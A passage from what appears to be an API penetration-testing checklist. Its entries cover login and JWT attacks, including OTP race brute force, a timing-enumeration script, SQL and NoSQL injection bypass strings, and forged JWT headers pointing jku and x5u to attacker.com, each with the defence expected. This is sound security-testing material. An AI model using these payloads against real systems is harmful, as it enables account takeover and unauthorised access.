**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0072 — WebSocket Authentication Bypass
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login endpoint — username/password fields

**Test Steps:** 1. Establish WebSocket connection<br><br>2. Skip or omit authentication message<br><br>3. Send protected commands<br><br>4. Check if authorized

**Expected Result:** Should authenticate WebSocket connections

**Payload / PoC Example:**

```
Connect without sending auth token
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0073 — 2FA OTP Brute-Force via Race Condition
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Login — 2FA/OTP verification endpoint

**Test Steps:** 1. Request OTP for valid account<br>2. Use Turbo Intruder to send all 6-digit codes simultaneously<br>3. Race to beat OTP expiry window<br>4. Test if rate limit reset after window

**Expected Result:** OTP locked after 3-5 attempts; rate limit persists across window resets

**Payload / PoC Example:**

```
# Turbo Intruder – parallel OTP brute
POST /api/verify-otp HTTP/1.1
{"otp": "%s", "session": "sess_abc123"}

# Payload list: 000000 → 999999 (1M requests)
# Or focus on common patterns first:
000000, 111111, 123456, 654321, 999999

# Race condition – send 200 in parallel window
gate = 'race1'
engine.queue(target.req, otp, gate=gate)
engine.openGate('race1')
```

**Impact:** 2FA/MFA bypass defeats second factor; account takeover

**Tools:** Turbo Intruder, Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0074 — Timing-Based Account Enumeration
**Phase:** 4-Auth: Login · **Category:** Authentication · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Login — Login endpoint — username/password fields

**Test Steps:** 1. Send 30 requests with valid username + wrong password<br>2. Send 30 requests with invalid username<br>3. Calculate mean response time for each<br>4. Statistical difference &gt; 50ms = enumerable

**Expected Result:** Constant-time comparison used; identical response times regardless of username existence

**Payload / PoC Example:**

```
# Python timing script
import requests, statistics, time

def measure(username, n=30):
    times = []
    for _ in range(n):
        s = time.time()
        requests.post('/api/login', json={"username": username, "password": "wrongpassword"})
        times.append(time.time() - s)
    return statistics.mean(times)

valid_time   = measure("admin@target.com")
invalid_time = measure("doesnotexist@xyz.com")
print(f"Valid: {valid_time:.3f}s  Invalid: {invalid_time:.3f}s  Delta: {abs(valid_time-invalid_time):.3f}s")
```

**Impact:** Login bypass / brute force enabling account takeover

**Tools:** Python timing script, Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0075 — Username enumeration via diff responses
**Phase:** 4-Auth: Login · **Category:** Discovery · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** POST Recon — external attack surface (endpoints/params)

**Test Steps:** 1. Try valid-username + wrong-password vs invalid-username<br>2. Compare codes/timing/length of responses<br>3. Confirm via 100 known/unknown sample

**Expected Result:** Identical response for both cases

**Payload / PoC Example:**

```
Different errors: 'User not found' vs 'Invalid password'
```

**Impact:** Targeted brute force

**Tools:** Burp Suite,ffuf

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API5:2023 Broken Function Level Authorization

---

## API-0076 — SQL injection auth bypass
**Phase:** 4-Auth: Login · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Request params / JSON body / query filters

**Test Steps:** 1. Inject ' OR '1'='1'-- - in username/password<br>2. Test admin'-- -<br>3. Try UNION-based extraction with sqlmap

**Expected Result:** Use parameterized queries

**Payload / PoC Example:**

```
username: admin'-- -
```

**Impact:** Full DB read; auth bypass

**Tools:** sqlmap,Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0077 — NoSQL injection auth bypass (Mongo / Couch)
**Phase:** 4-Auth: Login · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Request params / JSON body / query filters

**Test Steps:** 1. Send {"username":{"$gt":""},"password":{"$gt":""}}<br>2. Test {"username":"admin","password":{"$ne":1}}<br>3. Use NoSQLMap regex blind

**Expected Result:** Validate input types and operators

**Payload / PoC Example:**

```
{"username":{"$gt":""},"password":{"$gt":""}}
```

**Impact:** Auth bypass + blind data exfil

**Tools:** NoSQLMap,Burp Suite

**References:** -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQLi; PayloadsAllTheThings; OWASP API Security Top 10; API8:2023 Security Misconfiguration

---

## API-0078 — Brute force with rate-limit bypass
**Phase:** 4-Auth: Login · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Hydra / Burp Intruder password spray<br>2. Rotate X-Forwarded-For / X-Real-IP / True-Client-IP<br>3. Verify lockout per-account AND per-IP

**Expected Result:** Lockout per account and IP; CAPTCHA after N

**Payload / PoC Example:**

```
Top 1k passwords against admin account
```

**Impact:** Account takeover at scale

**Tools:** hydra,Burp Intruder

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0079 — JWT alg:none accepted
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT<br>2. Decode header; set "alg":"none"<br>3. Remove signature<br>4. Send token

**Expected Result:** Server rejects tokens with alg=none

**Payload / PoC Example:**

```
Header: {"alg":"none"}
```

**Impact:** Forge any user; full ATO

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0080 — JWT RS256 to HS256 algorithm confusion
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture RS256 token<br>2. Get public key (jwks endpoint)<br>3. Sign new token with HS256 using public key as secret<br>4. Send

**Expected Result:** Server enforces algorithm whitelist

**Payload / PoC Example:**

```
jwt_tool -X k -pk public.pem
```

**Impact:** Full ATO from public-key knowledge

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0081 — JWT kid header path traversal
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Modify kid to ../../../dev/null<br>2. Sign token with empty key<br>3. Submit

**Expected Result:** Validate kid against allow-list; never read arbitrary files

**Payload / PoC Example:**

```
Header: {"kid":"../../../dev/null","alg":"HS256"}
```

**Impact:** Full ATO via key smuggling

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0082 — JWT jku header attacker JWKS
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Set jku to attacker URL<br>2. Host attacker JWKS; sign token with own key<br>3. Submit token

**Expected Result:** Never fetch keys from token-controlled URL

**Payload / PoC Example:**

```
Header: {"jku":"https://attacker.com/jwks.json"}
```

**Impact:** Full ATO

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0083 — JWT x5u header attacker certificate
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Set x5u to attacker URL<br>2. Host malicious cert<br>3. Sign token with corresponding private key

**Expected Result:** Pin trusted key sources

**Payload / PoC Example:**

```
Header: {"x5u":"https://attacker.com/cert.pem"}
```

**Impact:** Full ATO

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0084 — JWT embedded jwk attack
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Add jwk header containing attacker public key<br>2. Sign with corresponding private key

**Expected Result:** Server should not trust embedded keys

**Payload / PoC Example:**

```
Header: {"jwk":{...attacker pub...}}
```

**Impact:** Full ATO

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0085 — Expired JWT still accepted
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Wait for token to pass exp<br>2. Reuse token on protected endpoint

**Expected Result:** Server validates exp claim

**Payload / PoC Example:**

```
Use token after exp timestamp
```

**Impact:** Persistent ATO via stolen old token

**Tools:** Manual,jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0086 — JWT signature stripped accepted
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Modify payload (e.g. userId or role)<br>2. Keep header; remove signature segment OR keep original<br>3. Send token

**Expected Result:** Server validates signature

**Payload / PoC Example:**

```
Modify {"userId":1} to {"userId":2}
```

**Impact:** Privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0087 — JWKS cache poisoning race
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Time JWKS endpoint cache TTL<br>2. Force cache invalidation; race attacker JWKS into cache<br>3. Forge any token

**Expected Result:** Pin JWKS source; use cert pinning

**Payload / PoC Example:**

```
Multi-step: see PoC in checklist
```

**Impact:** Full ATO of any user

**Tools:** jwt_tool,Turbo Intruder

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0088 — JWT Algorithm Confusion (None)
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture valid JWT<br>2. Decode and change alg to 'none'<br>3. Remove signature<br>4. Send to server

**Expected Result:** Should reject tokens with 'none' algorithm

**Payload / PoC Example:**

```
Header: {"alg":"none"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0089 — JWT Algorithm Confusion (HS256 to RS256)
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Get JWT signed with RS256<br>2. Change algorithm to HS256<br>3. Sign with public key<br>4. Send request

**Expected Result:** Should validate algorithm matches expected

**Payload / PoC Example:**

```
Change RS256 to HS256, sign with public key
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0090 — JWT Token Expiration
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Login and get token<br>2. Wait for expiration<br>3. Try using expired token<br>4. Check if still valid

**Expected Result:** Should reject expired tokens

**Payload / PoC Example:**

```
Use token after exp timestamp
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** Manual/jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0091 — JWT Token Without Signature Validation
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Modify JWT payload (change userId)<br>2. Keep same signature<br>3. Send to server

**Expected Result:** Should validate signature and reject tampered tokens

**Payload / PoC Example:**

```
Change {"userId":1} to {"userId":2}, keep signature
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0092 — JWT Header Injection - kid Parameter
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT token<br>2. Modify kid header to path traversal<br>3. Point to known file content<br>4. Sign with known content

**Expected Result:** Should validate kid against allowlist

**Payload / PoC Example:**

```
Header: {"kid":"/dev/null", "alg":"HS256"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0093 — JWT Header Injection - jku Parameter
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT token<br>2. Set jku to attacker-controlled URL<br>3. Host malicious JWKS<br>4. Sign with attacker key

**Expected Result:** Should not fetch keys from token-provided URLs

**Payload / PoC Example:**

```
Header: {"jku":"https://attacker.com/jwks.json"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0094 — JWT Header Injection - x5u Parameter
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT token<br>2. Set x5u to attacker URL<br>3. Host malicious certificate<br>4. Sign with attacker certificate

**Expected Result:** Should hardcode trusted key sources

**Payload / PoC Example:**

```
Header: {"x5u":"https://attacker.com/cert.pem"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0095 — Admin JWT Never Expires
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Functions — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Get admin JWT<br>2. Check expiration time<br>3. Test if works indefinitely

**Expected Result:** Should have shorter expiration for admin (15-30 min)

**Payload / PoC Example:**

```
JWT with exp: 9999999999 (year 2286)
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0096 — JWT jku Header SSRF
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT with jku header<br>2. Set jku to attacker-controlled JWKS URL<br>3. Host malicious JWKS and sign forged token<br>4. Send forged token

**Expected Result:** Server uses hardcoded/pinned JWKS; jku header ignored

**Payload / PoC Example:**

```
JWT Header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0097 — JWT x5c Header Injection
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Create self-signed cert<br>2. Embed in x5c header of JWT<br>3. Sign token with private key of cert<br>4. Send to server

**Expected Result:** Server ignores x5c header; uses pinned certificate only

**Payload / PoC Example:**

```
JWT Header: {"x5c":["<attacker_cert_base64>"]}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0098 — JWKS Cache Poisoning
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Time requests to JWKS endpoint during cache refresh<br>2. Race to inject attacker JWKS before cache updates<br>3. Get server to cache attacker's public key

**Expected Result:** JWKS fetched from pinned trusted source; not user-controllable; long-lived cache

**Payload / PoC Example:**

```
Race condition on JWKS refresh endpoint; inject attacker key material
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** Turbo Intruder

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0099 — JWT JKU Header Injection
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Decode JWT header<br><br>2. Add jku pointing to attacker's server<br><br>3. Host malicious JWK on attacker server<br><br>4. Sign token with attacker's key

**Expected Result:** Should not fetch keys from token-provided URLs

**Payload / PoC Example:**

```
Header: {"jku":"https://attacker.com/jwks.json"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0100 — JWT X5U Header Injection
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Decode JWT header<br><br>2. Add x5u pointing to attacker's certificate<br><br>3. Host malicious certificate on attacker server<br><br>4. Sign token with attacker's certificate

**Expected Result:** Should not fetch certificates from token-provided URLs

**Payload / PoC Example:**

```
Header: {"x5u":"https://attacker.com/cert.pem"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0101 — JWT Claim Tampering
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Decode JWT payload<br><br>2. Modify claims (role, permissions, userId)<br><br>3. Re-encode without signature validation<br><br>4. Check if server accepts

**Expected Result:** Should validate signature before trusting claims

**Payload / PoC Example:**

```
Payload: {"role":"admin","userId":"1"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0102 — JWT Expiration Bypass
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture expired JWT<br><br>2. Try using expired token<br><br>3. Modify exp claim to future<br><br>4. Check if server validates expiration

**Expected Result:** Should reject expired tokens

**Payload / PoC Example:**

```
Modify exp to 9999999999
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0103 — JWT Issuer Validation Bypass
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Decode JWT<br><br>2. Modify iss claim to different issuer<br><br>3. Check if server validates issuer<br><br>4. Try cross-tenant token usage

**Expected Result:** Should validate iss claim against expected value

**Payload / PoC Example:**

```
Payload: {"iss":"attacker.com"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0104 — JWT Audience Validation Bypass
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Decode JWT<br><br>2. Modify aud claim<br><br>3. Use token on different API<br><br>4. Check if cross-service access allowed

**Expected Result:** Should validate aud claim matches intended API

**Payload / PoC Example:**

```
Payload: {"aud":"different-api"}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0105 — JWT x5c Self-Signed Certificate Injection
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Generate self-signed cert + private key<br>2. Embed cert in x5c JWT header<br>3. Sign token with attacker private key<br>4. Send forged token claiming admin role

**Expected Result:** Server ignores x5c/x5u; uses only pinned certificate for validation

**Payload / PoC Example:**

```
# Generate attacker cert
